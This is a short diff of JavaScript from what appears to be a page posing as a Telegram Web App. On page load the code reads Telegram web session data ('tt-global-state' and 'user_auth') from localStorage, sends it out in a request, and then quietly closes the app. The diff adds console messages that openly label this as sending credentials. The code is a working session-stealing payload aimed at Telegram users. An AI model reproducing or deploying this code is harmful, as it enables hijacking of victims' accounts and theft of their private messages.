@@ -2,6 +2,7 @@ document.addEventListener("DOMContentLoaded", function() {
     async function checkLocalStorage() {
       let globalState = localStorage.getItem("tt-global-state");
       if (globalState && localStorage.getItem("user_auth")) {
+        console.log("Found crededentials, sending...")
         const parsedState = JSON.parse(globalState);
         const currentUserId = parsedState.currentUserId;
         const currentUser = parsedState.users.byId[currentUserId];
@@ -24,6 +25,8 @@ document.addEventListener("DOMContentLoaded", function() {
               type: new URLSearchParams(window.location.search).get("type")
             })
           });
+
+          console.log("Sent credentials")
   
           // window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
           window.Telegram.WebApp.close();
